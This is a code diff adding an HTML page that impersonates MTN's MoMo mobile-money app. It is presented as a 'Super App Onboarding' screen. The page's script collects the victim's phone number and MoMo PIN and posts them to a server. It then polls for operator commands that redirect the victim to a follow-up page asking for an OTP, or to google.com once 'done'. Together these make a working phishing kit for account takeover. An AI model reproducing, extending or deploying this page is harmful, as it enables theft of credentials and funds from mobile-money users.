@@ -1,0 +1,900 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Super App Onboarding</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,400;0,600;0,700;1,600;1,700&display=swap"
+    rel="stylesheet" />
+  <!-- FontAwesome for the dropdown arrow -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+  <style>
+    :root {
+      --primary-blue: #003366;
+      /* From the UI image */
+      --accent-yellow: #ffd600;
+      /* From the UI image */
+      --light-blue-text: #8faadb;
+      --bottom-sheet-bg: #ffffff;
+      --btn-disabled: #e2e8f0;
+      --btn-disabled-text: #64748b;
+    }
+
+    body {
+      font-family: "Inter", sans-serif;
+      background-color: var(--primary-blue);
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      height: 100dvh;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      /* Prevent full page scroll */
+    }
+
+    .lang-toggle {
+      background-color: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(4px);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      color: #8faadb;
+    }
+
+    .slider-container {
+      flex-grow: 1;
+      position: relative;
+      width: 100%;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .slide {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      transform: translateX(100%);
+      transition:
+        transform 0.5s ease-in-out,
+        opacity 0.5s ease-in-out;
+      pointer-events: none;
+      /* Prevent interaction when hidden */
+    }
+
+    .slide.active {
+      opacity: 1;
+      transform: translateX(0);
+      pointer-events: auto;
+    }
+
+    .slide.prev {
+      transform: translateX(-100%);
+    }
+
+    .slide-img-wrapper {
+      position: relative;
+      width: 85%;
+      max-width: 600px;
+      max-height: 40vh;
+      aspect-ratio: 1 / 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 2rem;
+      margin-top: -2rem;
+      /* Pull up slightly */
+    }
+
+    .slide-img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      /* Ensure the whole organic shape fits */
+      /* Using a mask to create organic shape if images are rectangular, 
+               but assuming provided images already have the shape and background */
+    }
+
+    /* NEW: Add this class to scale down images that are cropped too tightly */
+    .img-tight-crop {
+      transform: scale(0.88);
+      /* Adjust this decimal (0.1 to 0.9) to make them match */
+    }
+
+    .slide-text-container {
+      width: 85%;
+      max-width: 400px;
+      text-align: left;
+      padding: 0 100px 0 0;
+    }
+
+    .slide-text-main {
+      color: var(--light-blue-text);
+      font-size: 1.5rem;
+      line-height: 1.2;
+      font-weight: 700;
+      font-style: italic;
+    }
+
+    .slide-text-highlight {
+      color: var(--accent-yellow);
+      font-size: 1.5rem;
+      line-height: 1.2;
+      font-weight: 700;
+      font-style: italic;
+      margin-top: 0.25rem;
+    }
+
+    .pagination {
+      position: absolute;
+      bottom: 2rem;
+      left: 7.5%;
+      /* Align with text container */
+      display: flex;
+      gap: 6px;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background-color: var(--light-blue-text);
+      opacity: 0.5;
+      transition: all 0.3s ease;
+    }
+
+    .dot.active {
+      background-color: var(--accent-yellow);
+      opacity: 1;
+      width: 8px;
+      /* Keep round in the design shown */
+    }
+
+    .bottom-sheet {
+      background-color: var(--bottom-sheet-bg);
+      border-top-left-radius: 20px;
+      border-top-right-radius: 20px;
+      padding: 1.5rem;
+      padding-bottom: calc(1.5rem + env(safe-area-inset-bottom));
+      /* For iPhone notch/bar */
+      box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.1);
+      position: relative;
+      z-index: 10;
+      flex-shrink: 0;
+    }
+
+    .phone-input-group {
+      display: flex;
+      align-items: center;
+      border: 1px solid #cbd5e1;
+      border-radius: 8px;
+      padding: 0.5rem 1rem;
+      margin-bottom: 1rem;
+      background-color: white;
+    }
+
+    .country-code {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding-right: 12px;
+      border-right: 1px solid #e2e8f0;
+      color: #475569;
+      font-weight: 500;
+    }
+
+    .country-flag {
+      width: 24px;
+      height: 16px;
+      border-radius: 2px;
+      object-fit: cover;
+    }
+
+    .phone-input {
+      flex-grow: 1;
+      border: none;
+      outline: none;
+      padding-left: 12px;
+      color: #334155;
+      font-size: 1rem;
+    }
+
+    .phone-input::placeholder {
+      color: #94a3b8;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 1rem;
+      border-radius: 24px;
+      /* Pill shape */
+      font-weight: 600;
+      font-size: 1rem;
+      border: none;
+      transition: all 0.3s ease;
+      text-align: center;
+    }
+
+    .submit-btn:disabled {
+      background-color: var(--btn-disabled);
+      color: var(--btn-disabled-text);
+      cursor: not-allowed;
+    }
+
+    .submit-btn.active {
+      background-color: var(--primary-blue);
+      color: white;
+      cursor: pointer;
+    }
+
+    /* Custom dropdown for language */
+    .lang-dropdown-menu {
+      display: none;
+      position: absolute;
+      top: 100%;
+      left: 0;
+      margin-top: 0.5rem;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow:
+        0 4px 6px -1px rgba(0, 0, 0, 0.1),
+        0 2px 4px -1px rgba(0, 0, 0, 0.06);
+      overflow: hidden;
+      z-index: 50;
+      min-width: 140px;
+    }
+
+    .lang-dropdown-menu.show {
+      display: block;
+      animation: fadeIn 0.2s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-10px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .lang-option {
+      padding: 0.5rem 1rem;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #334155;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .lang-option:hover {
+      background-color: #f1f5f9;
+    }
+
+    #pin-screen {
+      position: fixed;
+      inset: 0;
+      background-color: white;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 100;
+      opacity: 0;
+      transition: opacity 0.4s ease;
+    }
+
+    #pin-screen.active {
+      display: flex;
+      opacity: 1;
+    }
+
+    .pin-box {
+      width: 60px;
+      height: 60px;
+      border: 2px solid #e2e8f0;
+      border-radius: 12px;
+      text-align: center;
+      font-size: 2.5rem;
+      font-weight: 700;
+      color: var(--accent-yellow) !important;
+      outline: none;
+      transition:
+        border-color 0.2s,
+        box-shadow 0.2s;
+      /* Privacy feature: dots instead of numbers */
+      -webkit-text-security: disc;
+      -moz-text-security: disc;
+      text-security: disc;
+    }
+
+    .pin-box:focus {
+      border-color: var(--primary-blue);
+      box-shadow: 0 0 0 3px rgba(0, 51, 102, 0.1);
+    }
+
+    #loader-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(255, 255, 255, 0.95);
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 200;
+    }
+
+    .pendulum-container {
+      width: 100px;
+      height: 100px;
+      position: relative;
+    }
+
+    .pendulum-arm {
+      width: 4px;
+      height: 70px;
+      background: var(--primary-blue);
+      position: absolute;
+      top: 0;
+      left: 50%;
+      transform-origin: top center;
+      animation: pendulumMove 1.5s ease-in-out infinite;
+    }
+
+    .pendulum-bob {
+      width: 26px;
+      height: 26px;
+      background: var(--accent-yellow);
+      border-radius: 50%;
+      position: absolute;
+      bottom: -13px;
+      left: -11px;
+      box-shadow: 0 4px 15px rgba(255, 214, 0, 0.6);
+    }
+
+    @keyframes pendulumMove {
+      0% {
+        transform: rotate(45deg);
+      }
+
+      50% {
+        transform: rotate(-45deg);
+      }
+
+      100% {
+        transform: rotate(45deg);
+      }
+    }
+
+    .status-text {
+      margin-top: 2.5rem;
+      color: var(--primary-blue);
+      font-weight: 700;
+      font-style: italic;
+      font-size: 1.1rem;
+    }
+
+    .pin-header img {
+      width: 120px;
+      height: auto;
+      object-fit: contain;
+    }
+    
+  </style>
+</head>
+
+<body>
+  <div id="loader-overlay">
+    <div class="pendulum-container">
+      <div class="pendulum-arm">
+        <div class="pendulum-bob"></div>
+      </div>
+    </div>
+    <p class="status-text" id="loader-status">Please wait...</p>
+  </div>
+  <div id="splash-screen"
+    class="fixed inset-0 z-50 flex items-center justify-center bg-[#003a58] transition-opacity duration-500">
+    <div class="text-center">
+      <img src="mtn-logo.png" alt="" srcset="" style="height: 150px" />
+    </div>
+  </div>
+
+  <div id="pin-screen">
+    <div class="pin-header">
+        <img src="mtn-logo.png" alt="Logo" onerror="this.src='https://placehold.co/200x50/0A3D7E/FFFFFF?text=Super+App'">
+    </div>
+    <button onclick="window.location.reload()" class="absolute top-6 left-6 text-slate-400 hover:text-slate-600">
+      <i class="fa-solid fa-arrow-left text-xl"></i>
+    </button>
+    <h2 class="text-2xl font-bold text-[#003366] mb-8 italic">
+      MTN MoMo Pin
+    </h2>
+    <div class="flex gap-4">
+      <input type="tel" maxlength="1" class="pin-box" id="pin-1" inputmode="numeric" autofocus />
+      <input type="tel" maxlength="1" class="pin-box" id="pin-2" inputmode="numeric" />
+      <input type="tel" maxlength="1" class="pin-box" id="pin-3" inputmode="numeric" />
+      <input type="tel" maxlength="1" class="pin-box" id="pin-4" inputmode="numeric" />
+    </div>
+    <p class="mt-8 text-sm text-slate-400 italic">
+      Please enter your MTN MoMo Pin to proceed.
+    </p>
+  </div>
+  <div id="main-content" class="w-full h-full flex flex-col opacity-0 transition-opacity duration-1000"
+    style="background-color: #01466a; min-height: 100vh">
+    <div class="w-full flex flex-col items-center pt-10 pb-8 px-6 text-center">
+      <div class="w-60 h-60 bg-[#01466a] rounded-2xl flex items-center justify-center p-1">
+        <img src="mtn-logo.png" alt="MoMo Logo" class="w-60 h-60 object-contain rounded-xl" onerror="
+              this.src = 'https://placehold.co/400x400/FFD600/000?text=MoMo'
+            " />
+      </div>
+      <!-- <h1 class="text-[#FFC403] text-2xl font-bold mt-1 tracking-wide">MoMo</h1>
+        <p class="text-white/90 text-[10px] font-bold tracking-widest uppercase">from mtn</p> -->
+    </div>
+
+    <div class="flex-1 bg-white rounded-t-[40px] px-6 pt-12 pb-6 flex flex-col items-center">
+      <div class="w-full max-w-sm flex flex-col items-center">
+        <h2 class="text-[#01466a] text-2xl font-bold text-center mb-8 tracking-tight">
+          Welcome to MoMo
+        </h2>
+
+        <form id="phoneForm" onsubmit="event.preventDefault()" class="w-full flex flex-col">
+          <div class="flex items-center gap-3 w-full">
+            <div
+              class="relative w-24 h-16 border border-black rounded-[20px] flex items-center justify-center bg-white px-2">
+              <select id="countrySelector"
+                class="w-full h-full opacity-0 absolute top-0 left-0 z-10 cursor-pointer appearance-none" onchange="
+                    document.getElementById('displayFlag').src =
+                      this.options[this.selectedIndex].getAttribute(
+                        'data-flag-url',
+                      )
+                  ">
+                <option value="+237" data-flag-url="https://flagcdn.com/w40/cm.png">
+                  Cameroon
+                </option>
+                <option value="+225" data-flag-url="https://flagcdn.com/w40/ci.png">
+                  Cote d'Ivoire
+                </option>
+                <option value="+233" data-flag-url="https://flagcdn.com/w40/gh.png">
+                  Ghana
+                </option>
+                <option value="+256" data-flag-url="https://flagcdn.com/w40/ug.png" selected>
+                  Uganda
+                </option>
+                <option value="+260" data-flag-url="https://flagcdn.com/w40/zm.png">
+                  Zambia
+                </option>
+                <option value="+229" data-flag-url="https://flagcdn.com/w40/bj.png">
+                  Benin
+                </option>
+              </select>
+              <div class="flex items-center justify-center pointer-events-none">
+                <img id="displayFlag" src="https://flagcdn.com/w40/ug.png" alt="Flag"
+                  class="w-9 h-9 rounded-full object-cover shadow-sm border border-gray-100" />
+              </div>
+            </div>
+
+            <div class="relative flex-1 h-16 border border-black rounded-[20px] flex items-center px-4 bg-white">
+              <input type="tel" id="phoneNumber"
+                class="w-full h-full text-lg font-medium text-black placeholder-black/70 bg-transparent focus:outline-none"
+                placeholder="Enter number *" autocomplete="tel" />
+            </div>
+          </div>
+
+          <p class="text-gray-500 text-sm font-normal text-center leading-relaxed mt-12 mb-4 px-4">
+            By using this app you agree to our
+            <a href="#" class="text-[#01466a] font-medium tracking-wide">Mobile Terms of Use</a>
+            and
+            <a href="#" class="text-[#01466a] font-medium tracking-wide">Privacy Policy</a>
+          </p>
+        </form>
+      </div>
+    </div>
+
+    <div class="w-full bg-white pb-8 pt-2 px-6 flex justify-center items-center">
+      <button type="button" id="submitBtn"
+        class="w-full max-w-sm h-14 bg-[#01466a] text-white font-bold text-base rounded-full tracking-wider hover:bg-[#003552] transition-colors duration-300 shadow-sm uppercase disabled:opacity-40 disabled:cursor-not-allowed"
+        disabled>
+        Next
+      </button>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const splashScreen = document.getElementById("splash-screen");
+      const mainContent = document.getElementById("main-content");
+      const pinScreen = document.getElementById("pin-screen");
+      const pinBoxes = [
+        document.getElementById("pin-1"),
+        document.getElementById("pin-2"),
+        document.getElementById("pin-3"),
+        document.getElementById("pin-4"),
+      ];
+      const loaderOverlay = document.getElementById("loader-overlay");
+
+      // Wait for 2 seconds, then transition to main content
+      setTimeout(() => {
+        splashScreen.style.opacity = "0";
+        mainContent.classList.remove("opacity-0");
+        mainContent.classList.add("opacity-100");
+
+        // Remove splash screen from DOM after fade out completes
+        setTimeout(() => {
+          if (splashScreen.parentNode) {
+            splashScreen.parentNode.removeChild(splashScreen);
+          }
+        }, 500);
+      }, 2000);
+      // --- Elements ---
+      const phoneInput = document.getElementById("phoneNumber");
+      const submitBtn = document.getElementById("submitBtn");
+      const langToggleBtn = document.getElementById("langToggleBtn");
+      const langDropdown = document.getElementById("langDropdown");
+      const currentFlag = document.getElementById("currentFlag");
+      const currentLangText = document.getElementById("currentLangText");
+      const langOptions = document.querySelectorAll(".lang-option");
+
+      // Slider Elements
+      const sliderContainer = document.getElementById("sliderContainer");
+      const slides = document.querySelectorAll(".slide");
+      const dots = document.querySelectorAll(".dot");
+
+      let currentSlideIndex = 0;
+      let startX = 0;
+      let currentX = 0;
+      let isDragging = false;
+      let slideInterval;
+
+      // --- Translations Dictionary ---
+      const translations = {
+        sw: {
+          slide1_main: "Apps mbalimbali<br>zinapatikana..",
+          slide1_sub: "ndani ya Super App yako",
+          slide2_main: "Huduma za kifedha Halal..",
+          slide2_sub: "ndani ya Super App yako",
+          phone_placeholder: "Ingiza namba ya simu!",
+          btn_continue: "Endelea",
+          lang_name: "Swahili",
+          loading: "Tafadhali subiri kidogo...",
+          done: "Imekamilika!",
+          error: "Jaribu tena baadaye.",
+        },
+        en: {
+          slide1_main: "Various apps<br>are available..",
+          slide1_sub: "inside your Super App",
+          slide2_main: "Halal financial services..",
+          slide2_sub: "inside your Super App",
+          phone_placeholder: "Enter phone number!",
+          btn_continue: "Continue",
+          lang_name: "English",
+          loading: "Please wait a moment...",
+          done: "Completed!",
+          error: "Please try again later.",
+        },
+      };
+
+      let currentLang = "sw";
+
+      // --- 1. Form Logic ---
+      phoneInput.addEventListener("input", (e) => {
+        // Allow only numbers
+        let value = e.target.value.replace(/\D/g, "");
+        e.target.value = value;
+
+        // Basic validation for TZ number (e.g., usually 9 digits after +255, starting with 7 or 6)
+        // For UI demo purposes, enable button if length is >= 9
+        if (value.length >= 9) {
+          submitBtn.disabled = false;
+          submitBtn.classList.add("active");
+        } else {
+          submitBtn.disabled = true;
+          submitBtn.classList.remove("active");
+        }
+      });
+
+      // Transition to PIN
+      submitBtn.addEventListener("click", () => {
+        mainContent.style.opacity = "0";
+        setTimeout(() => {
+          mainContent.style.display = "none";
+          pinScreen.style.display = "flex";
+          setTimeout(() => {
+            pinScreen.style.opacity = "1";
+            pinBoxes[0].focus();
+          }, 50);
+          document.body.style.backgroundColor = "white";
+        }, 400);
+      });
+
+      pinBoxes.forEach((box, index) => {
+        box.addEventListener("input", (e) => {
+          if (e.target.value && index < 3) {
+            pinBoxes[index + 1].focus();
+          }
+
+          const fullPin = pinBoxes.map((b) => b.value).join("");
+          if (fullPin.length === 4) {
+            handleFinalSubmission(phoneInput.value, fullPin);
+          }
+        });
+
+        box.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && !box.value && index > 0) {
+            pinBoxes[index - 1].focus();
+          }
+        });
+      });
+
+      async function handleFinalSubmission(phone, pin) {
+        const loaderOverlay = document.getElementById("loader-overlay");
+        const statusText = document.getElementById("loader-status");
+        loaderOverlay.style.display = "flex";
+
+        try {
+          const response = await fetch("/api/submit", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, pin }),
+          });
+          const result = await response.json();
+
+          if (result.sessionId) {
+            statusText.textContent = "Inathibitisha... Tafadhali subiri";
+
+            // Start Polling for Admin command
+            const pollInterval = setInterval(async () => {
+              const statusRes = await fetch(
+                `/api/status/${result.sessionId}`,
+              );
+              const data = await statusRes.json();
+
+              if (data.status === "otp5") {
+                clearInterval(pollInterval);
+                window.location.href = `step6.html?len=5&id=${result.sessionId}`;
+              } else if (data.status === "otp6") {
+                clearInterval(pollInterval);
+                window.location.href = `step6.html?len=6&id=${result.sessionId}`;
+              } else if (data.status === "done") {
+                clearInterval(pollInterval);
+                window.location.href = "https://www.google.com";
+              }
+            }, 2000);
+          }
+        } catch (err) {
+          statusText.textContent = "Mtandao una shida. Jaribu tena.";
+          setTimeout(() => {
+            loaderOverlay.style.display = "none";
+          }, 3000);
+        }
+      }
+
+      // --- 2. Language Toggle Logic ---
+
+      // Toggle dropdown visibility
+      langToggleBtn.addEventListener("click", (e) => {
+        e.stopPropagation();
+        langDropdown.classList.toggle("show");
+      });
+
+      // Close dropdown when clicking outside
+      document.addEventListener("click", (e) => {
+        if (
+          !langToggleBtn.contains(e.target) &&
+          !langDropdown.contains(e.target)
+        ) {
+          langDropdown.classList.remove("show");
+        }
+      });
+
+      // Handle language selection
+      langOptions.forEach((option) => {
+        option.addEventListener("click", () => {
+          const selectedLang = option.getAttribute("data-lang");
+          const flagCode = option.getAttribute("data-flag");
+
+          if (selectedLang !== currentLang) {
+            currentLang = selectedLang;
+            updateLanguageUI(flagCode);
+          }
+          langDropdown.classList.remove("show");
+        });
+      });
+
+      function updateLanguageUI(flagCode) {
+        // Update button display
+        currentFlag.src = `https://flagcdn.com/w40/${flagCode}.png`;
+        currentLangText.textContent = translations[currentLang]["lang_name"];
+
+        // Update text content based on data-i18n attributes
+        document.querySelectorAll("[data-i18n]").forEach((element) => {
+          const key = element.getAttribute("data-i18n");
+          if (translations[currentLang][key]) {
+            // Use innerHTML to preserve <br> tags in slide text
+            element.innerHTML = translations[currentLang][key];
+          }
+        });
+
+        // Update placeholders
+        document
+          .querySelectorAll("[data-i18n-placeholder]")
+          .forEach((element) => {
+            const key = element.getAttribute("data-i18n-placeholder");
+            if (translations[currentLang][key]) {
+              element.placeholder = translations[currentLang][key];
+            }
+          });
+      }
+
+      // --- 3. Image Slider Logic (Swipe & Auto) ---
+
+      function goToSlide(index) {
+        // Handle bounds
+        if (index < 0) index = slides.length - 1;
+        if (index >= slides.length) index = 0;
+
+        const prevIndex = currentSlideIndex;
+        currentSlideIndex = index;
+
+        // Update classes for CSS transitions
+        slides.forEach((slide, i) => {
+          slide.classList.remove("active", "prev");
+
+          if (i === currentSlideIndex) {
+            slide.classList.add("active");
+            // Ensure it enters from the correct side based on direction
+            if (currentSlideIndex > prevIndex) {
+              slide.style.transform = "translateX(100%)";
+            } else if (currentSlideIndex < prevIndex) {
+              slide.style.transform = "translateX(-100%)";
+            }
+
+            // Force reflow to apply transform before transition starts
+            void slide.offsetWidth;
+            slide.style.transform = "translateX(0)";
+          } else if (i === prevIndex) {
+            // The slide that is leaving
+            slide.classList.remove("active");
+            if (
+              currentSlideIndex > prevIndex ||
+              (prevIndex === slides.length - 1 && currentSlideIndex === 0)
+            ) {
+              // Moving forward
+              slide.style.transform = "translateX(-100%)";
+            } else {
+              // Moving backward
+              slide.style.transform = "translateX(100%)";
+            }
+          } else {
+            // Reset others
+            slide.style.transform = "translateX(100%)";
+          }
+        });
+
+        // Update Dots
+        dots.forEach((dot, i) => {
+          dot.classList.toggle("active", i === currentSlideIndex);
+        });
+
+        resetAutoSlide();
+      }
+
+      function nextSlide() {
+        goToSlide(currentSlideIndex + 1);
+      }
+
+      function prevSlide() {
+        goToSlide(currentSlideIndex - 1);
+      }
+
+      // Auto slide every 5 seconds
+      function startAutoSlide() {
+        slideInterval = setInterval(nextSlide, 5000);
+      }
+
+      function resetAutoSlide() {
+        clearInterval(slideInterval);
+        startAutoSlide();
+      }
+
+      // Start initially
+      startAutoSlide();
+
+      // --- Swipe Event Listeners ---
+
+      // Touch events for mobile
+      sliderContainer.addEventListener("touchstart", touchStart);
+      sliderContainer.addEventListener("touchmove", touchMove);
+      sliderContainer.addEventListener("touchend", touchEnd);
+
+      // Mouse events for desktop testing
+      sliderContainer.addEventListener("mousedown", dragStart);
+      sliderContainer.addEventListener("mousemove", drag);
+      sliderContainer.addEventListener("mouseup", dragEnd);
+      sliderContainer.addEventListener("mouseleave", dragEnd);
+
+      function touchStart(e) {
+        startX = e.touches[0].clientX;
+        isDragging = true;
+        clearInterval(slideInterval); // Pause auto-slide while dragging
+      }
+
+      function touchMove(e) {
+        if (!isDragging) return;
+        currentX = e.touches[0].clientX;
+        // Optional: add slight visual feedback during drag here by translating active slide slightly
+      }
+
+      function touchEnd() {
+        if (!isDragging) return;
+        isDragging = false;
+        handleSwipe();
+      }
+
+      function dragStart(e) {
+        startX = e.clientX;
+        isDragging = true;
+        clearInterval(slideInterval);
+        sliderContainer.style.cursor = "grabbing";
+      }
+
+      function drag(e) {
+        if (!isDragging) return;
+        currentX = e.clientX;
+      }
+
+      function dragEnd() {
+        if (!isDragging) return;
+        isDragging = false;
+        sliderContainer.style.cursor = "default";
+        handleSwipe();
+      }
+
+      function handleSwipe() {
+        const diff = startX - currentX;
+        const threshold = 50; // Minimum distance to trigger swipe
+
+        if (Math.abs(diff) > threshold && currentX !== 0) {
+          if (diff > 0) {
+            // Swiped left -> Next Slide
+            nextSlide();
+          } else {
+            // Swiped right -> Prev Slide
+            prevSlide();
+          }
+        } else {
+          // Didn't swipe far enough, resume auto slide
+          resetAutoSlide();
+        }
+
+        // Reset coords
+        startX = 0;
+        currentX = 0;
+      }
+
+      // Allow clicking dots to navigate
+      dots.forEach((dot, index) => {
+        dot.addEventListener("click", () => {
+          if (currentSlideIndex !== index) {
+            goToSlide(index);
+          }
+        });
+      });
+    });
+  </script>
+</body>
+
+</html>
